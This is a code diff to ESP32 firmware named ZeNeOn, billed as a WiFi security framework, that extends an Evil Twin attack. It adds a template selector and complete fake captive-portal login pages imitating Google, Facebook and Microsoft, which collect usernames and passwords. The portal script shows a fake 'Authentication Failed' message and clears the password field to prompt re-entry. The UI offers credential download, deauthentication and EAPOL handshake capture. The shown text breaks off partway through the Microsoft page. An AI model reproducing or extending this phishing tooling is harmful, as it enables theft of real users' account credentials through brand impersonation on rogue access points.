@@ -64,6 +64,7 @@ int targetChannel = 1;
 uint8_t ownAPMAC[6] = {0};
 String evilTwinSSID = "";
 int credentialsCount = 0;
+int portalTemplate = 0; // 0=Generic WiFi, 1=Google, 2=Facebook, 3=Microsoft, 4=Apple
 
 #define MAX_CLIENTS 32
 uint8_t clientMACs[MAX_CLIENTS][6];
@@ -185,77 +186,64 @@ String header() {
 <meta charset="UTF-8">
 <title>{ZeNeOn}</title>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:#05080f;color:#00d4ff;font-family:'Share Tech Mono','Courier New',monospace;min-height:100vh;padding-bottom:70px;position:relative;overflow-x:hidden}
-body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,rgba(0,140,255,0.03) 0px,transparent 2px,transparent 4px);pointer-events:none;z-index:1;animation:scan 8s linear infinite}
-body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,rgba(0,0,0,0.15),rgba(0,0,0,0.15) 1px,transparent 1px,transparent 2px);pointer-events:none;z-index:2;opacity:0.3}
-@keyframes scan{0%{transform:translateY(0)}100%{transform:translateY(20px)}}
-@keyframes glow{0%,100%{text-shadow:0 0 10px #00d4ff,0 0 20px #0066ff,0 0 30px #0044cc}50%{text-shadow:0 0 5px #00d4ff,0 0 10px #0066ff}}
-@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
-.top{padding:25px;text-align:center;background:rgba(5,8,20,0.97);border-bottom:2px solid #0066ff;box-shadow:0 0 30px rgba(0,100,255,0.3);position:sticky;top:0;z-index:100;border-radius:0 0 16px 16px}
-.top h1{font-size:28px;color:#00d4ff;letter-spacing:4px;animation:glow 4s ease-in-out infinite}
+body{background:#05080f;color:#00d4ff;font-family:'Courier New',monospace;min-height:100vh;padding-bottom:70px;overflow-x:hidden}
+.top{padding:20px;text-align:center;background:#080c18;border-bottom:2px solid #0066ff;position:sticky;top:0;z-index:100;border-radius:0 0 12px 12px}
+.top h1{font-size:26px;color:#00d4ff;letter-spacing:3px}
 .top h1::before{content:'> '}
-.top h1::after{content:' _';animation:blink 1s step-end infinite}
-.sub{font-size:11px;opacity:0.6;margin-top:8px;letter-spacing:2px;color:#5599cc}
-.container{max-width:800px;margin:0 auto;padding:20px;position:relative;z-index:3}
-.card{background:rgba(8,14,30,0.92);border:1px solid rgba(0,100,255,0.4);padding:22px;margin-bottom:16px;border-radius:14px;box-shadow:0 0 15px rgba(0,100,255,0.12),inset 0 0 15px rgba(0,100,255,0.03);transition:box-shadow 0.3s,border-color 0.3s}
-.card:hover{box-shadow:0 0 25px rgba(0,140,255,0.25),inset 0 0 20px rgba(0,100,255,0.06);border-color:rgba(0,140,255,0.7)}
-.card h3{color:#00d4ff;margin-bottom:12px;font-size:18px;text-shadow:0 0 8px rgba(0,140,255,0.6);letter-spacing:2px;text-transform:uppercase;padding-left:18px;position:relative}
-button{width:100%;padding:14px 20px;margin-top:10px;background:rgba(0,30,60,0.7);color:#00d4ff;border:1px solid #0066ff;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.3s;box-shadow:0 0 10px rgba(0,100,255,0.25),inset 0 0 10px rgba(0,100,255,0.08);font-family:'Share Tech Mono','Courier New',monospace;letter-spacing:1px;text-transform:uppercase;position:relative;overflow:hidden;border-radius:10px}
+.sub{font-size:11px;opacity:0.6;margin-top:6px;letter-spacing:2px;color:#5599cc}
+.container{max-width:800px;margin:0 auto;padding:16px;position:relative;z-index:3}
+.card{background:#080e1e;border:1px solid rgba(0,100,255,0.4);padding:18px;margin-bottom:14px;border-radius:12px}
+.card h3{color:#00d4ff;margin-bottom:10px;font-size:16px;letter-spacing:2px;text-transform:uppercase;padding-left:16px}
+button{width:100%;padding:12px 18px;margin-top:8px;background:rgba(0,30,60,0.7);color:#00d4ff;border:1px solid #0066ff;font-size:14px;font-weight:600;cursor:pointer;font-family:'Courier New',monospace;letter-spacing:1px;text-transform:uppercase;border-radius:8px}
 button:disabled{opacity:0.4;cursor:not-allowed}
-button:not(:disabled):hover{transform:translateY(-2px);box-shadow:0 0 20px rgba(0,140,255,0.5),inset 0 0 20px rgba(0,100,255,0.15);background:rgba(0,50,100,0.8);color:#fff;text-shadow:0 0 10px #00d4ff}
-button:active{transform:translateY(0)}
-button.danger{background:rgba(30,5,10,0.7);border-color:#ff0040;color:#ff0040;box-shadow:0 0 10px rgba(255,0,64,0.25),inset 0 0 10px rgba(255,0,64,0.08);border-radius:10px}
-button.danger:not(:disabled):hover{box-shadow:0 0 20px rgba(255,0,64,0.5);background:rgba(50,5,15,0.8);color:#fff;text-shadow:0 0 10px #ff0040}
-button.secondary{background:rgba(5,15,30,0.7);border-color:#0055cc;color:#55aaff;box-shadow:0 0 10px rgba(0,80,200,0.2);border-radius:10px}
-button.secondary:not(:disabled):hover{box-shadow:0 0 20px rgba(0,120,255,0.5);background:rgba(10,30,60,0.8);color:#00d4ff;text-shadow:0 0 10px #0088ff}
-button.success{background:rgba(0,30,10,0.7);border-color:#00ff88;color:#00ff88;box-shadow:0 0 10px rgba(0,255,136,0.25),inset 0 0 10px rgba(0,255,136,0.08);border-radius:10px}
-button.success:not(:disabled):hover{box-shadow:0 0 20px rgba(0,255,136,0.5);background:rgba(0,50,20,0.8);color:#fff;text-shadow:0 0 10px #00ff88}
-input{width:100%;padding:14px;margin-top:10px;background:rgba(5,10,20,0.85);color:#00d4ff;border:1px solid rgba(0,100,255,0.4);font-size:15px;transition:all 0.3s;font-family:'Share Tech Mono','Courier New',monospace;box-shadow:inset 0 0 10px rgba(0,100,255,0.08);border-radius:10px}
-input:focus{outline:none;border-color:#00d4ff;box-shadow:0 0 15px rgba(0,140,255,0.35),inset 0 0 15px rgba(0,100,255,0.15)}
+button:not(:disabled):hover{background:rgba(0,50,100,0.8);color:#fff}
+button.danger{background:rgba(30,5,10,0.7);border-color:#ff0040;color:#ff0040}
+button.danger:not(:disabled):hover{background:rgba(50,5,15,0.8);color:#fff}
+button.secondary{background:rgba(5,15,30,0.7);border-color:#0055cc;color:#55aaff}
+button.secondary:not(:disabled):hover{background:rgba(10,30,60,0.8);color:#00d4ff}
+button.success{background:rgba(0,30,10,0.7);border-color:#00ff88;color:#00ff88}
+button.success:not(:disabled):hover{background:rgba(0,50,20,0.8);color:#fff}
+input,select{width:100%;padding:12px;margin-top:8px;background:#050a14;color:#00d4ff;border:1px solid rgba(0,100,255,0.4);font-size:14px;font-family:'Courier New',monospace;border-radius:8px}
+input:focus,select:focus{outline:none;border-color:#00d4ff}
 input::placeholder{color:rgba(0,160,255,0.35)}
-.net-item{background:rgba(8,14,28,0.6);border:1px solid rgba(0,100,255,0.3);padding:14px;margin-top:10px;cursor:pointer;transition:all 0.3s;position:relative;overflow:hidden;border-radius:10px}
-.net-item::after{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:#0088ff;transform:scaleY(0);transition:transform 0.3s;box-shadow:0 0 10px #0088ff;border-radius:0 3px 3px 0}
-.net-item:hover{background:rgba(10,25,50,0.7);border-color:#0088ff;transform:translateX(10px);box-shadow:0 0 15px rgba(0,100,255,0.25)}
-.net-item:hover::after{transform:scaleY(1)}
-.net-item.selected{background:rgba(10,30,60,0.8);border-color:#00d4ff;box-shadow:0 0 20px rgba(0,140,255,0.4),inset 0 0 20px rgba(0,100,255,0.08)}
-.net-item.selected::after{transform:scaleY(1)}
-.net-name{font-weight:600;font-size:15px;margin-bottom:4px;color:#00d4ff;text-shadow:0 0 5px rgba(0,140,255,0.5)}
+.net-item{background:rgba(8,14,28,0.6);border:1px solid rgba(0,100,255,0.3);padding:12px;margin-top:8px;cursor:pointer;border-radius:8px;border-left:3px solid transparent}
+.net-item:hover{background:rgba(10,25,50,0.7);border-left-color:#0088ff}
+.net-item.selected{background:rgba(10,30,60,0.8);border-color:#00d4ff;border-left-color:#00d4ff}
+.net-name{font-weight:600;font-size:14px;margin-bottom:3px;color:#00d4ff}
 .net-details{font-size:12px;color:#5599cc;opacity:0.9}
-.status{padding:12px 15px;background:rgba(5,15,30,0.6);border-left:4px solid #0088ff;margin:12px 0;font-size:13px;color:#00d4ff;position:relative;z-index:1;box-shadow:0 0 10px rgba(0,100,255,0.15);border-radius:0 10px 10px 0}
-.status.warning{background:rgba(30,20,0,0.6);border-left-color:#ffaa00;color:#ffaa00;box-shadow:0 0 10px rgba(255,170,0,0.15);border-radius:0 10px 10px 0}
+.status{padding:10px 14px;background:rgba(5,15,30,0.6);border-left:4px solid #0088ff;margin:10px 0;font-size:13px;color:#00d4ff;border-radius:0 8px 8px 0}
+.status.warning{background:rgba(30,20,0,0.6);border-left-color:#ffaa00;color:#ffaa00}
 .status.warning::before{content:'\u26a0 '}
-.status.error{background:rgba(25,5,10,0.6);border-left-color:#ff0040;color:#ff0040;box-shadow:0 0 10px rgba(255,0,64,0.15);border-radius:0 10px 10px 0}
+.status.error{background:rgba(25,5,10,0.6);border-left-color:#ff0040;color:#ff0040}
 .status.error::before{content:'\u2716 '}
-.status.success{background:rgba(0,25,10,0.6);border-left-color:#00ff88;color:#00ff88;box-shadow:0 0 10px rgba(0,255,136,0.15);border-radius:0 10px 10px 0}
+.status.success{background:rgba(0,25,10,0.6);border-left-color:#00ff88;color:#00ff88}
 .status.success::before{content:'\u2714 '}
-.grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
 .hidden{display:none}
-.eapol-grid{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:8px;margin:12px 0}
-.eapol-box{text-align:center;padding:12px 8px;border-radius:8px;border:1px solid rgba(0,100,255,0.3);background:rgba(5,10,20,0.6);transition:all 0.3s}
-.eapol-box.captured{border-color:#00ff88;background:rgba(0,40,20,0.6);box-shadow:0 0 12px rgba(0,255,136,0.3)}
+.eapol-grid{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:6px;margin:10px 0}
+.eapol-box{text-align:center;padding:10px 6px;border-radius:6px;border:1px solid rgba(0,100,255,0.3);background:rgba(5,10,20,0.6)}
+.eapol-box.captured{border-color:#00ff88;background:rgba(0,40,20,0.6)}
 .eapol-box .label{font-size:11px;opacity:0.6;margin-bottom:4px}
-.eapol-box .count{font-size:20px;font-weight:bold}
+.eapol-box .count{font-size:18px;font-weight:bold}
 .eapol-box.captured .count{color:#00ff88}
-.phase-bar{background:rgba(5,10,20,0.8);border:1px solid rgba(0,100,255,0.3);border-radius:10px;padding:15px;margin:12px 0}
-.phase-steps{display:flex;justify-content:space-between;margin-bottom:10px}
-.phase-step{text-align:center;flex:1;padding:8px 4px;font-size:11px;opacity:0.4;border-bottom:2px solid rgba(0,100,255,0.2);transition:all 0.3s}
+.phase-bar{background:rgba(5,10,20,0.8);border:1px solid rgba(0,100,255,0.3);border-radius:8px;padding:12px;margin:10px 0}
+.phase-steps{display:flex;justify-content:space-between;margin-bottom:8px}
+.phase-step{text-align:center;flex:1;padding:6px 4px;font-size:11px;opacity:0.4;border-bottom:2px solid rgba(0,100,255,0.2)}
 .phase-step.active{opacity:1;border-bottom-color:#ffaa00;color:#ffaa00}
 .phase-step.done{opacity:0.8;border-bottom-color:#00ff88;color:#00ff88}
-.progress-outer{background:rgba(0,30,60,0.5);border-radius:6px;height:8px;overflow:hidden;margin-top:8px}
-.progress-inner{height:100%;background:linear-gradient(90deg,#0066ff,#00d4ff);border-radius:6px;transition:width 0.5s;width:0%}
-.capture-quality{display:flex;gap:10px;margin:12px 0;flex-wrap:wrap}
-.cq-item{flex:1;min-width:100px;text-align:center;padding:10px;border-radius:8px;border:1px solid rgba(0,100,255,0.2);background:rgba(5,10,20,0.5)}
-.cq-item .cq-val{font-size:18px;font-weight:bold;margin-bottom:2px}
+.progress-outer{background:rgba(0,30,60,0.5);border-radius:4px;height:6px;overflow:hidden;margin-top:6px}
+.progress-inner{height:100%;background:#0088ff;border-radius:4px;width:0%}
+.capture-quality{display:flex;gap:8px;margin:10px 0;flex-wrap:wrap}
+.cq-item{flex:1;min-width:80px;text-align:center;padding:8px;border-radius:6px;border:1px solid rgba(0,100,255,0.2);background:rgba(5,10,20,0.5)}
+.cq-item .cq-val{font-size:16px;font-weight:bold;margin-bottom:2px}
 .cq-item .cq-lbl{font-size:10px;opacity:0.6}
-.footer{position:fixed;bottom:0;left:0;right:0;text-align:center;padding:12px;background:rgba(5,8,20,0.95);border-top:1px solid rgba(0,100,255,0.3);font-size:11px;color:#5599cc;z-index:100;letter-spacing:1px;backdrop-filter:blur(10px)}
-.footer a{color:#00d4ff;text-decoration:none;transition:all 0.3s}
-.footer a:hover{color:#fff;text-shadow:0 0 10px #00d4ff}
+.footer{position:fixed;bottom:0;left:0;right:0;text-align:center;padding:10px;background:#080c18;border-top:1px solid rgba(0,100,255,0.3);font-size:11px;color:#5599cc;z-index:100;letter-spacing:1px}
+.footer a{color:#00d4ff;text-decoration:none}
+.footer a:hover{color:#fff}
 @media(max-width:600px){.grid{grid-template-columns:1fr}.eapol-grid{grid-template-columns:1fr 1fr}}
 </style></head><body>
-<div class="top"><h1>{ZeNeOn}</h1><div class="sub">ESP32 WiFi Security Assessment Framework v5.0</div></div>
+<div class="top"><h1>{ZeNeOn}</h1><div class="sub">ESP32 WiFi Security Framework v5.0</div></div>
 <div class="container">
 )rawliteral";
 }
@@ -349,16 +337,16 @@ String deauthUI() {
 </div>
 
 <div style="margin-top:12px">
-<h3 style="color:#00d4ff;font-size:14px;margin-bottom:8px;letter-spacing:2px">⟩ EAPOL 4-WAY HANDSHAKE TERMINAL</h3>
-<div id="termWrap" style="background:#020408;border:1px solid rgba(0,100,255,0.4);border-radius:10px;padding:2px;box-shadow:0 0 20px rgba(0,80,200,0.2),inset 0 0 30px rgba(0,0,0,0.8)">
-<div style="display:flex;align-items:center;padding:6px 12px;background:rgba(0,40,80,0.4);border-radius:8px 8px 0 0;border-bottom:1px solid rgba(0,100,255,0.2)">
-<div style="width:8px;height:8px;border-radius:50%;background:#ff3b30;margin-right:6px"></div>
-<div style="width:8px;height:8px;border-radius:50%;background:#ffcc00;margin-right:6px"></div>
-<div style="width:8px;height:8px;border-radius:50%;background:#00ff88;margin-right:10px"></div>
-<span style="font-size:11px;color:#5599cc;letter-spacing:1px">eapol_monitor — live</span>
-<span id="termBlink" style="margin-left:auto;color:#00ff88;font-size:11px;animation:blink 1s step-end infinite">●</span>
+<h3 style="color:#00d4ff;font-size:14px;margin-bottom:8px;letter-spacing:2px">EAPOL 4-WAY HANDSHAKE TERMINAL</h3>
+<div id="termWrap" style="background:#020408;border:1px solid rgba(0,100,255,0.4);border-radius:8px;padding:2px">
+<div style="display:flex;align-items:center;padding:5px 10px;background:rgba(0,40,80,0.4);border-radius:6px 6px 0 0;border-bottom:1px solid rgba(0,100,255,0.2)">
+<div style="width:7px;height:7px;border-radius:50%;background:#ff3b30;margin-right:5px"></div>
+<div style="width:7px;height:7px;border-radius:50%;background:#ffcc00;margin-right:5px"></div>
+<div style="width:7px;height:7px;border-radius:50%;background:#00ff88;margin-right:8px"></div>
+<span style="font-size:11px;color:#5599cc;letter-spacing:1px">eapol_monitor</span>
+<span id="termBlink" style="margin-left:auto;color:#00ff88;font-size:11px">&#9679;</span>
 </div>
-<div id="terminal" style="height:220px;overflow-y:auto;padding:10px 14px;font-size:12px;line-height:1.7;color:#00cc66;font-family:'Share Tech Mono',monospace;scroll-behavior:smooth"><span style='color:#5599cc'>Waiting for attack to start...</span>
+<div id="terminal" style="height:200px;overflow-y:auto;padding:8px 12px;font-size:12px;line-height:1.6;color:#00cc66;font-family:'Courier New',monospace"><span style='color:#5599cc'>Waiting for attack to start...</span>
 </div></div></div>
 </div>
 
@@ -601,30 +589,38 @@ String evilUI() {
   return header() + R"rawliteral(
 <div class="card">
 <h3>Evil Twin Attack</h3>
-<p style="margin-bottom:15px;opacity:0.7">Create a fake AP with captive portal to harvest credentials</p>
+<p style="margin-bottom:12px;opacity:0.7">Create a fake AP with captive portal to harvest credentials</p>
 <input id="s" placeholder="Enter target SSID name" value="">
-<button onclick="startEvil()">👁 Launch Evil Twin</button>
-<button class="danger" onclick="stopEvil()">⬛ Stop Evil Twin</button>
-<button class="secondary" onclick="getCreds()">⬇ Download Credentials</button>
+<select id="tpl" style="margin-top:8px">
+<option value="0">Generic WiFi Login</option>
+<option value="1">Google Sign-In</option>
+<option value="2">Facebook Login</option>
+<option value="3">Microsoft Account</option>
+<option value="4">Apple ID Login</option>
+</select>
+<button onclick="startEvil()">Launch Evil Twin</button>
+<button class="danger" onclick="stopEvil()">Stop Evil Twin</button>
+<button class="secondary" onclick="getCreds()">Download Credentials</button>
 <div id="status" class="status hidden"></div>
 <div id="credCount" class="status hidden" style="margin-top:10px"></div>
 </div>
-<button class="secondary" onclick="location.href='/'">← Back to Home</button>
+<button class="secondary" onclick="location.href='/'">&#8592; Back to Home</button>
 <script>
 let credPoll=null;
 function startEvil(){
   let ssid=document.getElementById('s').value;
+  let tpl=document.getElementById('tpl').value;
   if(!ssid){
     document.getElementById('status').className='status warning';
     document.getElementById('status').classList.remove('hidden');
     document.getElementById('status').innerHTML='Enter an SSID name';
     return;
   }
-  fetch('/evil?ssid='+encodeURIComponent(ssid))
+  fetch('/evil?ssid='+encodeURIComponent(ssid)+'&tpl='+tpl)
   .then(r=>r.text()).then(d=>{
     document.getElementById('status').className='status warning';
     document.getElementById('status').classList.remove('hidden');
-    document.getElementById('status').innerHTML='<strong>Evil Twin Active!</strong><br>Main AP replaced.<br><strong>⟳ RECONNECT to "'+ssid+'" now!</strong>';
+    document.getElementById('status').innerHTML='<strong>Evil Twin Active!</strong><br>Template: '+document.getElementById('tpl').selectedOptions[0].text+'<br><strong>Reconnect to "'+ssid+'" now!</strong>';
     pollCreds();
   });
 }
@@ -692,51 +688,7 @@ function stopSpam(){
 
 String captivePortal() {
   String ssid = evilTwinSSID.length() > 0 ? evilTwinSSID : "Free_WiFi";
-  return R"rawliteral(
-<!DOCTYPE html><html><head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
-<title>Network Authentication</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
-body{background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
-.box{background:#fff;width:100%;max-width:420px;border-radius:12px;box-shadow:0 8px 25px rgba(0,0,0,0.1);overflow:hidden;position:relative}
-.hd{background:linear-gradient(135deg,#0066cc,#004499);color:#fff;padding:30px 25px;text-align:center}
-.hd h1{font-size:24px;font-weight:600;margin-bottom:8px}
-.hd p{font-size:14px;opacity:0.9}
-.badge{background:rgba(255,255,255,0.2);display:inline-block;padding:6px 12px;border-radius:20px;font-size:12px;margin-top:15px}
-.ct{padding:30px 25px}
-.notice{background:#e8f4fd;border-left:4px solid #0066cc;padding:12px;margin-bottom:25px;font-size:13px;color:#333;border-radius:4px}
-.fg{margin-bottom:20px}
-.fg label{display:block;margin-bottom:6px;font-weight:500;font-size:14px;color:#333}
-.fg input{width:100%;padding:12px 15px;border:1px solid #ddd;border-radius:6px;font-size:16px}
-.fg input:focus{outline:none;border-color:#0066cc;box-shadow:0 0 0 3px rgba(0,102,204,0.1)}
-.opts{display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;font-size:14px}
-.rem{display:flex;align-items:center;gap:8px}
-.rem input{width:auto}
-.fl{color:#0066cc;text-decoration:none}
-.btn{width:100%;padding:14px;background:#0066cc;color:#fff;border:none;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:20px}
-.btn:hover{background:#0052a3}
-.ft{text-align:center;padding:20px;background:#f5f5f5;font-size:12px;color:#666}
-.lo{display:none;position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,0.95);z-index:1000;align-items:center;justify-content:center;flex-direction:column}
-.sp{width:40px;height:40px;border:4px solid #ddd;border-top:4px solid #0066cc;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}
-@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-.st{font-weight:600;margin-bottom:8px;color:#333}
-.sd{font-size:14px;color:#666}
-</style></head><body>
-<div class="box">
-<div class="lo" id="lo"><div class="sp"></div><div class="st" id="stxt">Authenticating...</div><div class="sd" id="sdtl">Please wait</div></div>
-<div class="hd"><h1>Network Authentication</h1><p>Secure connection required</p><div class="badge">SSID: )rawliteral" +
-         ssid + R"rawliteral(</div></div>
-<div class="ct">
-<div class="notice"><strong>Security Notice:</strong> Authentication required for internet access.</div>
-<form id="lf" onsubmit="doLogin(event)">
-<div class="fg"><label>Username or Email</label><input type="text" id="u" name="username" placeholder="Enter username or email" required></div>
-<div class="fg"><label>Password</label><input type="password" id="p" name="password" placeholder="Enter password" required></div>
-<div class="opts"><label class="rem"><input type="checkbox"> Remember me</label><a href="#" class="fl" onclick="return false">Forgot password?</a></div>
-<button type="submit" class="btn">Sign In</button>
-</form></div>
-<div class="ft"><p>&copy; 2026 Network Services. All rights reserved.</p></div>
-</div>
+  String submitJS = R"rawliteral(
 <script>
 function doLogin(e){
   e.preventDefault();
@@ -746,7 +698,7 @@ function doLogin(e){
     setTimeout(function(){
       document.getElementById('stxt').textContent='Authentication Failed';
       document.getElementById('sdtl').textContent='Invalid credentials. Try again.';
-      document.getElementById('sdtl').style.color='#cc2244';
+      document.getElementById('sdtl').style.color='#c00';
       setTimeout(function(){
         document.getElementById('lo').style.display='none';
         document.getElementById('p').value='';
@@ -758,8 +710,213 @@ function doLogin(e){
   });
   return false;
 }
-</script></body></html>
-)rawliteral";
+</script>)rawliteral";
+
+  String loaderCSS = ".lo{display:none;position:absolute;top:0;left:0;right:0;bottom:0;background:rgba(255,255,255,0.95);z-index:1000;align-items:center;justify-content:center;flex-direction:column}"
+    ".sp{width:36px;height:36px;border:3px solid #ddd;border-top:3px solid #0066cc;border-radius:50%;animation:spin .8s linear infinite;margin-bottom:16px}"
+    "@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}"
+    ".st{font-weight:600;margin-bottom:6px;color:#333}.sd{font-size:14px;color:#666}";
+
+  String loaderHTML = "<div class='lo' id='lo'><div class='sp'></div><div class='st' id='stxt'>Authenticating...</div><div class='sd' id='sdtl'>Please wait</div></div>";
+
+  switch (portalTemplate) {
+    case 1: // Google Sign-In
+      return R"rawliteral(
+<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Sign in - Google Accounts</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Roboto,Arial,sans-serif}
+body{background:#f0f4f9;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
+.box{background:#fff;width:100%;max-width:450px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,0.12);padding:48px 40px;position:relative}
+.logo{text-align:center;margin-bottom:16px;font-size:24px;font-weight:500;color:#202124}
+.logo span{color:#4285f4}
+.logo .g2{color:#ea4335}.logo .g3{color:#fbbc04}.logo .g4{color:#4285f4}.logo .g5{color:#34a853}.logo .g6{color:#ea4335}
+.sub{text-align:center;font-size:16px;color:#202124;margin-bottom:4px;font-weight:400}
+.sub2{text-align:center;font-size:14px;color:#5f6368;margin-bottom:28px}
+.fg{margin-bottom:24px}
+.fg label{display:block;font-size:12px;color:#5f6368;margin-bottom:4px}
+.fg input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124}
+.fg input:focus{outline:none;border-color:#1a73e8;border-width:2px;padding:12px 14px}
+.fl{display:inline-block;font-size:14px;color:#1a73e8;text-decoration:none;margin-bottom:28px;font-weight:500}
+.btn{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:500;cursor:pointer}
+.btn:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,0.2)}
+.ft{margin-top:32px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
+.ft a{color:#5f6368;text-decoration:none}
+)rawliteral" + loaderCSS + R"rawliteral(
+</style></head><body>
+<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
+<div class="logo"><span class="g1">G</span><span class="g2">o</span><span class="g3">o</span><span class="g4">g</span><span class="g5">l</span><span class="g6">e</span></div>
+<div class="sub">Sign in</div>
+<div class="sub2">to continue to )rawliteral" + ssid + R"rawliteral(</div>
+<form id="lf" onsubmit="doLogin(event)">
+<div class="fg"><input type="text" id="u" name="username" placeholder="Email or phone" required></div>
+<div class="fg"><input type="password" id="p" name="password" placeholder="Enter your password" required></div>
+<a href="#" class="fl" onclick="return false">Forgot password?</a>
+<button type="submit" class="btn">Next</button>
+</form>
+<div class="ft"><a href="#" onclick="return false">Create account</a><a href="#" onclick="return false">Help</a></div>
+</div>)rawliteral" + submitJS + "</body></html>";
+
+    case 2: // Facebook Login
+      return R"rawliteral(
+<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Log in to Facebook</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Helvetica,Arial,sans-serif}
+body{background:#f0f2f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
+.wrap{width:100%;max-width:400px}
+.logo{text-align:center;margin-bottom:16px}
+.logo h1{color:#1877f2;font-size:32px;font-weight:700;letter-spacing:-1px}
+.box{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);position:relative}
+.fg input{width:100%;padding:14px 16px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;color:#1d2129}
+.fg input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
+.fg input::placeholder{color:#8a8d91}
+.btn{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-bottom:16px}
+.btn:hover{background:#166fe5}
+.sep{text-align:center;margin:16px 0;position:relative}
+.sep::before{content:'';position:absolute;left:0;top:50%;right:0;border-top:1px solid #dadde1}
+.sep span{background:#fff;padding:0 16px;position:relative;color:#8a8d91;font-size:14px}
+.fl{display:block;text-align:center;color:#1877f2;text-decoration:none;font-size:14px;margin-bottom:20px}
+.new{display:block;width:fit-content;margin:0 auto;padding:12px 24px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer;text-decoration:none}
+.ft{text-align:center;margin-top:24px;font-size:12px;color:#8a8d91}
+)rawliteral" + loaderCSS + R"rawliteral(
+</style></head><body>
+<div class="wrap">
+<div class="logo"><h1>facebook</h1></div>
+<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
+<form id="lf" onsubmit="doLogin(event)">
+<div class="fg"><input type="text" id="u" name="username" placeholder="Email address or phone number" required></div>
+<div class="fg"><input type="password" id="p" name="password" placeholder="Password" required></div>
+<button type="submit" class="btn">Log in</button>
+</form>
+<a href="#" class="fl" onclick="return false">Forgotten password?</a>
+<div class="sep"><span>or</span></div>
+<a href="#" class="new" onclick="return false">Create new account</a>
+</div>
+<div class="ft"><p>WiFi requires authentication via )rawliteral" + ssid + R"rawliteral(</p></div>
+</div>)rawliteral" + submitJS + "</body></html>";
+
+    case 3: // Microsoft Account
+      return R"rawliteral(
+<!DOCTYPE html><html><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
+<title>Sign in to your account</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif}
+body{background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:15px}
+.box{background:#fff;width:100%;max-width:440px;box-shadow:0 2px 6px rgba(0,0,0,0.2);padding:44px;position:relative}
+.logo{margin-bottom:16px}
+.logo .ms{display:inline-grid;grid-template-columns:11px 11px;gap:2px;vertical-align:middle;margin-right:8px}
+.logo .ms div:nth-child(1){background:#f25022;width:11px;height:11px}
+.logo .ms div:nth-child(2){background:#7fba00;width:11px;height:11px}
+.logo .ms div:nth-child(3){background:#00a4ef;width:11px;height:11px}
+.logo .ms div:nth-child(4){background:#ffb900;width:11px;height:11px}
+.logo span{font-size:20px;font-weight:600;color:#1b1b1b;vertical-align:middle}
+.title{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px}
+.sub{font-size:13px;color:#1b1b1b;margin-bottom:24px}
+.fg{margin-bottom:16px}
+.fg input{width:100%;padding:8px 10px;border:none;border-bottom:1px solid #666;font-size:15px;color:#1b1b1b;background:transparent}
+.fg input:focus{outline:none;border-bottom-color:#0067b8;border-bottom-width:2px;padding-bottom:7px}
+.fg input::placeholder{color:#666}
+.fl{font-size:13px;color:#0067b8;text-decoration:none;display:block;margin-bottom:24px}
+.btn{padding:9px 16px;background:#0067b8;color:#fff;border:none;font-size:15px;font-weight:600;cursor:pointer;float:right;min-width:108px}
+.btn:hover{background:#005da3}
+.ft{clear:both;padding-top:36px;font-size:12px;color:#666}
+)rawliteral" + loaderCSS + R"rawliteral(
+</style></head><body>
+<div class="box">)rawliteral" + loaderHTML + R"rawliteral(
+<div class="logo"><div class="ms"><div></div><div></div><div></div><div></div></div><span>Microsoft</span></div>
+<div class="title">Sign in</div>
